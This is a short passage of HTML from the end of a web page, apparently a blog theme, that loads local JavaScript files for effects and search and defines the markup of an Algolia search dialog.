src="/js/fancybox.js?version=1.5.6"></script><script src="/js/sidebar.js?version=1.5.6"></script><script src="/js/copy.js?version=1.5.6"></script><script src="/js/fireworks.js?version=1.5.6"></script><script src="/js/transition.js?version=1.5.6"></script><script src="/js/scroll.js?version=1.5.6"></script><script src="/js/head.js?version=1.5.6"></script><script src="/js/search/algolia.js"></script><div class="search-dialog" id="algolia-search"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>